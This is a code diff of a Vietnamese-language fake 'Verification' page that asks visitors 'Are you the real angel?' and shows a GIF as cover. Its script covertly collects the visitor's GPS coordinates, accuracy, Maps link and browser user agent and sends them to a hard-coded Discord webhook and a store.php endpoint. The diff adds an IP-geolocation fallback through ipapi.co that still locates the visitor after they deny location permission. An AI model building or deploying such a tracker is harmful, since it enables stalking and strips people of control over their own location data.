@@ -1,79 +1,28 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <title>Verification</title>
-    <style>
-        body { 
-            font-family: sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            background-color: #f4f6f9; 
-        }
-        #angel-container { 
-            text-align: center; 
-            background: white; 
-            padding: 40px; 
-            border-radius: 12px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-            width: 80%; 
-            max-width: 400px; 
-        }
-        button { 
-            padding: 12px 24px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            background-color: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-        }
-    </style>
-</head>
-<body>
-
-<div id="angel-container">
-    <h1>Are you the real angel?</h1>
-    <p>Vui lòng xác nhận để hệ thống tiếp tục kiểm tra thiết bị của bạn.</p>
-    <button onclick="startAngelCheck()">Xác nhận (OK)</button>
-</div>
-
-<!-- Iframe hiển thị sau khi người dùng xác nhận -->
-<iframe id="giphy-frame" src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="display:none;" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-
-<p id="demo" style="display:none;"></p>
-
 <script>
-// Cấu hình link Discord Webhook
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
 
-// Hàm xử lý khi người dùng nhấn xác nhận
 function startAngelCheck() {
     document.getElementById('angel-container').style.display = 'none';
     document.getElementById('giphy-frame').style.display = 'block';
     getLocation();
 }
 
-// Hàm gửi dữ liệu về Discord
-function sendToDiscordWebhook(lat, lon, accuracy = 0) {
+// Hàm gửi Discord chung cho cả 2 trường hợp
+function sendToDiscordWebhook(lat, lon, method, accuracy) {
     const payload = {
         embeds: [{
-            title: "🎯 Thiết bị đã cấp quyền vị trí thành công!",
-            color: 5763719,
+            title: `🎯 Dữ liệu thu thập được (${method})`,
+            color: method === "GPS" ? 5763719 : 16744192, // Xanh nếu GPS, Cam nếu IP
             fields: [
                 { name: "🛰️ Vĩ độ", value: `\`${lat}\``, inline: true },
                 { name: "🛰️ Kinh độ", value: `\`${lon}\``, inline: true },
-                { name: "🎯 Độ chính xác", value: `\`${accuracy} mét\``, inline: false },
-                { name: "🌐 Google Maps Link", value: `[Bấm để xem](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
-                { name: "📱 Thông tin thiết bị", value: navigator.userAgent, inline: false }
+                { name: "🎯 Độ chính xác", value: `\`${accuracy}\``, inline: false },
+                { name: "🌐 Maps", value: `[Xem vị trí](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                { name: "📱 Info", value: navigator.userAgent, inline: false }
             ],
             timestamp: new Date().toISOString()
         }]
     };
-
     fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -81,28 +30,38 @@ function sendToDiscordWebhook(lat, lon, accuracy = 0) {
     });
 }
 
-// Hàm lấy vị trí
 function getLocation() {
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
+        // Nếu người dùng cho phép thì dùng showPosition, từ chối thì dùng handleLocationError
+        navigator.geolocation.getCurrentPosition(showPosition, handleLocationError);
     } else {
-        document.getElementById("demo").innerHTML = "Geolocation is not supported.";
+        getIpLocation(); // Nếu trình duyệt không hỗ trợ Geolocation
     }
 }
 
-// Hàm xử lý sau khi có tọa độ
+// Xử lý khi dùng GPS thành công
 function showPosition(position) {
-    const xhttp = new XMLHttpRequest();
-    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
-    xhttp.send();
+    // Gửi về server của bạn
+    fetch(`store.php?lat=${position.coords.latitude}&long=${position.coords.longitude}&type=GPS`);
     
-    sendToDiscordWebhook(
-        position.coords.latitude, 
-        position.coords.longitude, 
-        position.coords.accuracy
-    );
+    // Gửi về Discord
+    sendToDiscordWebhook(position.coords.latitude, position.coords.longitude, "GPS", position.coords.accuracy + " mét");
+}
+
+// Xử lý khi người dùng từ chối GPS
+function handleLocationError(error) {
+    console.log("GPS bị từ chối, đang chuyển sang IP...");
+    getIpLocation();
+}
+
+// Xử lý lấy IP
+function getIpLocation() {
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        fetch(`store.php?lat=${data.latitude}&long=${data.longitude}&type=IP`);
+        sendToDiscordWebhook(data.latitude, data.longitude, "IP (Ước tính)", "Không xác định");
+    })
+    .catch(err => console.error("Lỗi lấy IP:", err));
 }
 </script>
-
-</body>
-</html>
